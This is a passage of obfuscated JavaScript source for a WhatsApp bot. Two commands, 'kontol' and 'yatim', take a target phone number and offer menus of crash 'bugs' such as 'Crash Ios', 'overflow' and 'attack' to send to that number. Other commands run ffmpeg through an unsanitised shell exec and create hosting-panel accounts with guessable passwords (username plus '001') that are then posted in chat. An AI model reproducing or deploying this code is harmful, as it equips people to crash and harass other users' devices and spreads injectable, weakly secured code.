            let _0x2902ca = await (await fetch("https://widipe.com/openai?text=" + _0x288ff4)).json();
            const _0x2548db = {
              _0x110705: {},
              _0xe95360: 0x2
            };
            const _0x1099d7 = {
              text: namabot
            };
            const _0x221693 = {
              upload: _0x799da7._0x4d1b66
            };
            const _0x202e58 = {
              name: "quick_reply",
              _0x14eb59: "{\"display_text\":\"Nice anas - AI\",\"id\":\".mangap\"}"
            };
            const _0x55f1b3 = {
              buttons: [_0x202e58]
            };
            let _0x528cb9 = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
              "_0x48cb7a": {
                "message": {
                  "messageContextInfo": _0x2548db,
                  "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                    "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create({
                      "text": "> anas - AI\n\n" + _0x2902ca.result
                    }),
                    "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0x1099d7),
                    "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                      "_0x163f12": false,
                      ...(await prepareWAMessageMedia({
                        "image": fs._0x4fdcbb("./dah.jpg")
                      }, _0x221693))
                    }),
                    "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create(_0x55f1b3),
                    "_0x997701": {
                      "_0xe6f9af": [_0x516d4a.sender],
                      "_0x3d0c3e": 0x3e7,
                      "_0x4baafc": true,
                      "_0x20e012": {
                        "_0x334d20": "0@newsletter",
                        "_0x196138": namabot,
                        "_0x30246d": 0x8f
                      }
                    }
                  })
                }
              }
            }, {
              "_0x1b9bca": _0x516d4a
            });
            await _0x799da7._0x35132e(_0x516d4a._0x19b14a, _0x528cb9.message, {});
          } catch (_0x3ea78d) {
            return _0x105e8a("Error Kak :(");
          }
        }
        break;
      case "kontol":
        {
          if (!_0x211fa5) {
            return _0x105e8a(mess.only._0x36cabb);
          }
          if (!q) {
            return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0x1739cf = {
            title: " vip ",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": " 𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "vip " + target
            }]
          };
          const _0x2c5427 = {
            title: " 𝙖𝙣𝙙𝙧𝙤 ",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "andro " + target
            }]
          };
          const _0x5a53ba = {
            title: " 𝐈𝐧𝐯𝐢𝐬𝐢𝐱 𝐂𝐫𝐚𝐬𝐡",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "attack " + target
            }]
          };
          const _0x420410 = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "xios " + target
          };
          const _0x430a17 = {
            title: "𝐂𝐫𝐚𝐬𝐡 𝐈𝐨𝐬",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆  ",
            rows: [_0x420410]
          };
          const _0x45dd5f = {
            title: " 𝙭𝙞𝙥",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "xip " + target
            }]
          };
          const _0x337e7c = {
            title: " 𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "iphone " + target
            }]
          };
          const _0x3501b5 = {
            title: " 𝘼𝙋𝘼 𝙇𝘼𝙃",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "apalah " + target
            }]
          };
          const _0x5973c9 = {
            title: " 𝙀𝙒𝙀𝙆",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "ewek " + target
            }]
          };
          const _0x41b267 = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "crashflow " + target
          };
          const _0x35bdce = {
            title: "𝙘𝙧𝙖𝙨𝙝𝙛𝙡𝙤𝙬",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼",
            rows: [_0x41b267]
          };
          const _0x3dfbcb = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "vasion " + target
          };
          const _0x3e4268 = {
            title: " 𝙫𝙖𝙨𝙞𝙤𝙣 ",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [_0x3dfbcb]
          };
          const _0x514abc = {
            title: " 𝙤𝙫𝙚𝙧𝙛𝙡𝙤𝙬 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "overflow " + target
            }]
          };
          let _0x22ba3 = [_0x1739cf, _0x2c5427, _0x5a53ba, _0x430a17, _0x45dd5f, _0x337e7c, _0x3501b5, _0x5973c9, _0x35bdce, _0x3e4268, _0x514abc];
          const _0x2d5678 = {
            title: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            _0x3cb1e3: _0x22ba3
          };
          const _0x5d70e3 = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0x2ed3a0 = {
            text: "𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 : " + target + "\n\n𝙋𝙄𝙇𝙄𝙃 𝙈𝙀𝙉𝙐 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃"
          };
          const _0x4414cf = {
            text: ''
          };
          const _0x46b7de = {
            name: "cta_url",
            _0x14eb59: "{\"display_text\":\"𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚\",\"url\":\"https://youtube.com/@AnnasIncus\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
          };
          let _0x42f84a = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0x5d70e3,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x4baafc": true,
                    "_0x20e012": {
                      "_0x334d20": "0@newsletter",
                      "_0x196138": "Powered By 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼",
                      "_0x30246d": -1
                    },
                    "_0x4ef4e2": {
                      "_0x290630": _0x799da7._0xb59c48(_0x799da7._0x40fd71.id)
                    }
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x2ed3a0),
                  "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0x4414cf),
                  "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                    "title": '',
                    "_0x378735": "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
                    "_0x163f12": true,
                    ...(await prepareWAMessageMedia({
                      "image": await fs._0x4fdcbb("./image/mama.jpg")
                    }, {
                      "upload": _0x799da7._0x4d1b66
                    }))
                  }),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "single_select",
                      "_0x14eb59": JSON.stringify(_0x2d5678)
                    }, _0x46b7de]
                  })
                })
              }
            }
          }, {});
          await _0x799da7._0x35132e(_0x42f84a.key._0x500b53, _0x42f84a.message, {
            "_0x560a27": _0x42f84a.key.id
          });
        }
        break;
      case "hdvid":
      case "hdvideo":
      case "vidiohd":
      case "tohd":
      case "vidhd":
        {
          const {
            exec: _0xab7d1d
          } = require('child_process');
          const _0x3ac409 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca : _0x516d4a;
          const _0x4e6085 = (_0x3ac409._0x1c69dd || _0x3ac409)._0x2952b3 || '';
          if (!_0x4e6085) {
            return _0x516d4a._0x3dfdd4("Mana vidio nya bang?");
          }
          _0x105e8a(mess.wait);
          const _0xf88078 = await _0x799da7._0x4b1d35(_0x3ac409);
          _0xab7d1d("ffmpeg -i " + _0xf88078 + " -s 1280x720 -c:v libx264 -c:a copy " + "output.mp4", (_0x2a5e78, _0x31ac67, _0x1ba480) => {
            if (_0x2a5e78) {
              console.error("Error: " + _0x2a5e78.message);
              return;
            }
            console.log("stdout: " + _0x31ac67);
            console.error("stderr: " + _0x1ba480);
            const _0x3ce286 = {
              url: "output.mp4"
            };
            const _0x57b5b5 = {
              caption: "_Success To HD Video_",
              _0x12059a: _0x3ce286
            };
            _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, _0x57b5b5, {
              "_0x1b9bca": _0x516d4a
            });
          });
          await sleep(60000);
          fs._0x6a8190("output.mp4");
          fs._0x6a8190(_0xf88078);
        }
        break;
      case "yatim":
        {
          if (!_0x211fa5) {
            return _0x105e8a(mess.only._0x36cabb);
          }
          if (!q) {
            return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0x39b784 = {
            title: " 𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "stuk " + target
          };
          const _0x59387a = {
            title: "𝙎𝙩𝙪𝙠",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [_0x39b784]
          };
          const _0x2d1370 = {
            title: " 𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "flow " + target
            }]
          };
          const _0x31028a = {
            title: " 𝙊𝙡𝙖 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "ola " + target
            }]
          };
          const _0x425a5e = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "dor🔫 " + target
          };
          const _0x61fe59 = {
            title: " 𝙙𝙤𝙧🔫 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [_0x425a5e]
          };
          const _0x522839 = {
            title: " 𝘼𝙢𝙥𝙖𝙨",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "ampas " + target
            }]
          };
          const _0x509ee3 = {
            title: " 𝘼𝙣𝙟𝙞𝙣𝙜 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "anjing " + target
            }]
          };
          const _0x2833a1 = {
            title: " 𝙁𝙪𝙘𝙠 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "fuck " + target
            }]
          };
          let _0x46477b = [_0x59387a, _0x2d1370, _0x31028a, _0x61fe59, _0x522839, _0x509ee3, _0x2833a1];
          const _0x3e18ac = {
            title: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            _0x3cb1e3: _0x46477b
          };
          const _0x1dfa8a = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0x25f2c7 = {
            text: "𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 : " + target + " 𝙋𝙄𝙇𝙄𝙃 𝙈𝙀𝙉𝙐 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃"
          };
          const _0x49fb6f = {
            text: ''
          };
          let _0x2e7099 = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0x1dfa8a,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x4baafc": true,
                    "_0x20e012": {
                      "_0x334d20": "0@newsletter",
                      "_0x196138": "Powered By 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼",
                      "_0x30246d": -1
                    },
                    "_0x4ef4e2": {
                      "_0x290630": _0x799da7._0xb59c48(_0x799da7._0x40fd71.id)
                    }
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x25f2c7),
                  "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0x49fb6f),
                  "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                    "title": '',
                    "_0x378735": "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
                    "_0x163f12": true,
                    ...(await prepareWAMessageMedia({
                      "image": await fs._0x4fdcbb("./image/mama.jpg")
                    }, {
                      "upload": _0x799da7._0x4d1b66
                    }))
                  }),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "single_select",
                      "_0x14eb59": JSON.stringify(_0x3e18ac)
                    }, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚\",\"url\":\"https://youtube.com/@AnnasIncus\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x799da7._0x35132e(_0x2e7099.key._0x500b53, _0x2e7099.message, {
            "_0x560a27": _0x2e7099.key.id
          });
        }
        break;
      case "enc":
      case "encrypt":
      case "obfuscate":
        {
          if (!q) {
            return _0x105e8a("Contoh " + (_0x5999dc + _0x1a4aba) + " const time = require('money')");
          }
          let _0x2e57db = await _0x3d334f(q);
          _0x105e8a('' + _0x2e57db.result);
        }
        break;
      case "1gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x50b91c = _0x288ff4.split(",");
          if (_0x50b91c.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x3927ec = _0x50b91c[0];
          let _0x55033f = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x50b91c[1] ? _0x50b91c[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x40a080 = global._0x69757;
          let _0x5d7650 = global.location;
          let _0x5e1cf9 = _0x3927ec + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x55033f) {
            return;
          }
          let _0x585a23 = _0x3927ec + "001";
          const _0x55b1bf = {
            email: _0x5e1cf9,
            username: _0x3927ec,
            _0x377fa4: _0x3927ec,
            _0x7b8227: _0x3927ec,
            language: "en",
            password: _0x585a23
          };
          let _0x9f87c0 = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x55b1bf)
          });
          let _0x2d008f = await _0x9f87c0.json();
          if (_0x2d008f._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x2d008f._0x3f542c[0], null, 2));
          }
          let _0x407dde = _0x2d008f.attributes;
          let _0x130c1c = await fetch(domain + "/api/application/nests/5/eggs/" + _0x40a080, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x407dde.id);
          let _0x5c3d6e = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x407dde.username + "\n🔐 Password: " + _0x585a23 + "\n🔗 Url: " + domain;
          const _0x55448c = {
            "url": "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x2fdd7d = {
            image: _0x55448c,
            caption: _0x5c3d6e
          };
          const _0x4c3f2f = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x55033f, _0x2fdd7d, _0x4c3f2f);
          let _0x1a7ebd = await _0x130c1c.json();
          let _0x531ace = _0x1a7ebd.attributes._0x30673f;
          const _0x53dee1 = {
            memory: "1024",
            _0x56747b: 0x0,
            _0x3c531b: "1024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "50"
          };
          const _0x539b3e = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x2a7f20 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x3927ec + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x407dde.id,
              "_0x54ce": parseInt(_0x40a080),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x531ace,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x53dee1,
              "_0x1da287": _0x539b3e,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x5d7650)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x1484ad = await _0x2a7f20.json();
          if (_0x1484ad._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x1484ad._0x3f542c[0], null, 2));
          }
        }
        break;
      case "2gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x3c89f2 = _0x288ff4.split(",");
          if (_0x3c89f2.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x5a51ca = _0x3c89f2[0];
          let _0x4d71ea = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x3c89f2[1] ? _0x3c89f2[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x2a7d69 = global._0x69757;
          let _0x360cb1 = global.location;
          let _0x35b75f = _0x5a51ca + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x4d71ea) {
            return;
          }
          let _0x339d14 = _0x5a51ca + "001";
          const _0x4b8c1a = {
            email: _0x35b75f,
            username: _0x5a51ca,
            _0x377fa4: _0x5a51ca,
            _0x7b8227: _0x5a51ca,
            language: "en",
            password: _0x339d14
          };
          let _0x2ab7e8 = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x4b8c1a)
          });
          let _0x6c3d7a = await _0x2ab7e8.json();
          if (_0x6c3d7a._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x6c3d7a._0x3f542c[0], null, 2));
          }
          let _0x34c882 = _0x6c3d7a.attributes;
          let _0x557a9a = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2a7d69, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x34c882.id);
          let _0x253fba = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x34c882.username + "\n🔐 Password: " + _0x339d14 + "\n🔗 Url: " + domain;
          const _0x52e7e7 = {
            url: "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x2666a2 = {
            image: _0x52e7e7,
            caption: _0x253fba
          };
          const _0x3cb79a = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x4d71ea, _0x2666a2, _0x3cb79a);
          let _0xde0878 = await _0x557a9a.json();
          let _0x319801 = _0xde0878.attributes._0x30673f;
          const _0x31858b = {
            memory: "2024",
            _0x56747b: 0x0,
            _0x3c531b: "2024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "70"
          };
          const _0x2ea52d = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0x56b24d = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x5a51ca + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0x34c882.id,
              "_0x54ce": parseInt(_0x2a7d69),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x319801,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x31858b,
              "_0x1da287": _0x2ea52d,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x360cb1)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x2714da = await _0x56b24d.json();
          if (_0x2714da._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x2714da._0x3f542c[0], null, 2));
          }
        }
        break;
      case "3gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x312b89 = _0x288ff4.split(",");
          if (_0x312b89.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x155495 = _0x312b89[0];
          let _0x1c7e36 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x312b89[1] ? _0x312b89[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0xd1609c = global._0x69757;
          let _0x3e494b = global.location;
          let _0x1e4dc5 = _0x155495 + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x1c7e36) {
            return;
          }
          let _0x4b964a = _0x155495 + "001";
          const _0x1a0d12 = {
            email: _0x1e4dc5,
            username: _0x155495,
            _0x377fa4: _0x155495,
            _0x7b8227: _0x155495,
            language: "en",
            password: _0x4b964a
          };
          let _0x1f694b = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x1a0d12)
          });
          let _0x5ae88e = await _0x1f694b.json();
          if (_0x5ae88e._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x5ae88e._0x3f542c[0], null, 2));
          }
          let _0xe02f26 = _0x5ae88e.attributes;
          let _0x2d7af0 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xd1609c, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0xe02f26.id);
          let _0x40eacb = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0xe02f26.username + "\n🔐 Password: " + _0x4b964a + "\n🔗 Url: " + domain;
          const _0x2992b6 = {
            url: "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x26fbac = {
            image: _0x2992b6,
            caption: _0x40eacb
          };
          const _0x301aec = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x1c7e36, _0x26fbac, _0x301aec);
          let _0x3058e0 = await _0x2d7af0.json();
          let _0x33f671 = _0x3058e0.attributes._0x30673f;
          const _0x4f5b9c = {
            memory: "3024",
            _0x56747b: 0x0,
            _0x3c531b: "3024",
            _0x18344c: 0x1f4,
            _0x77ac7e: "80"
          };
          const _0x1855c9 = {
            databases: 0x5,
            _0x4aeba7: 0x5,
            _0x5f0f93: 0x5
          };
          let _0xa7ed89 = await fetch(domain + "/api/application/servers", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify({
              "name": _0x155495 + " - 1gb",
              "description": "Create with " + namabot,
              "_0x40fd71": _0xe02f26.id,
              "_0x54ce": parseInt(_0xd1609c),
              "_0x322ec9": "ghcr.io/parkervcp/yolks:nodejs_18",
              "_0x30673f": _0x33f671,
              "_0xc7386d": {
                "_0x3e35a2": "npm",
                "_0xff8691": "0",
                "_0x5134a7": "0",
                "_0x38da55": "npm start"
              },
              "_0x3aa761": _0x4f5b9c,
              "_0x1da287": _0x1855c9,
              "_0x1b8f6a": {
                "_0x59938f": [parseInt(_0x3e494b)],
                "_0x10bc71": false,
                "_0x2f85ca": []
              }
            })
          });
          let _0x2725cf = await _0xa7ed89.json();
          if (_0x2725cf._0x3f542c) {
            return _0x799da7(JSON.stringify(_0x2725cf._0x3f542c[0], null, 2));
          }
        }
        break;
      case "4gb":
        {
          if (!_0x211fa5) {
            _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x164b81 = _0x288ff4.split(",");
          if (_0x164b81.length < 2) {
            return _0x105e8a("Format salah!\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " user,nomer");
          }
          let _0x325049 = _0x164b81[0];
          let _0x10cd7c = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x164b81[1] ? _0x164b81[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x516d4a._0xe6f9af[0];
          let _0x2771b4 = global._0x69757;
          let _0x26f21b = global.location;
          let _0xafed62 = _0x325049 + "anas@Tzy.com";
          akunlo = "https://j.top4top.io/m_3201f7cps0.mp4";
          if (!_0x10cd7c) {
            return;
          }
          let _0x136282 = _0x325049 + "001";
          const _0x2252ce = {
            email: _0xafed62,
            username: _0x325049,
            _0x377fa4: _0x325049,
            _0x7b8227: _0x325049,
            language: "en",
            password: _0x136282
          };
          let _0x371ff9 = await fetch(domain + "/api/application/users", {
            "method": "POST",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            },
            "body": JSON.stringify(_0x2252ce)
          });
          let _0x42838f = await _0x371ff9.json();
          if (_0x42838f._0x3f542c) {
            return _0x105e8a(JSON.stringify(_0x42838f._0x3f542c[0], null, 2));
          }
          let _0x40cc88 = _0x42838f.attributes;
          let _0x22714a = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2771b4, {
            "method": "GET",
            "headers": {
              "_0x7065e4": "application/json",
              "_0x28533e": "application/json",
              "_0x2afbd6": "Bearer " + apikey
            }
          });
          _0x105e8a("User ID: " + _0x40cc88.id);
          let _0x523ae6 = "Hai @" + _0x516d4a.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x40cc88.username + "\n🔐 Password: " + _0x136282 + "\n🔗 Url: " + domain;
          const _0x1c1018 = {
            "url": "https://j.top4top.io/m_3201f7cps0.mp4"
          };
          const _0x5167ce = {
            image: _0x1c1018,
            caption: _0x523ae6
          };
          const _0x5e6849 = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x10cd7c, _0x5167ce, _0x5e6849);
          let _0x1b12eb = await _0x22714a.json();
          let _0x5dcb22 = _0x1b12eb.attributes._0x30673f;
          const _0x9c7cf = {
            memory: "4024",
            _0x56747b: 0x0,
            _0x3c531b: "4024",
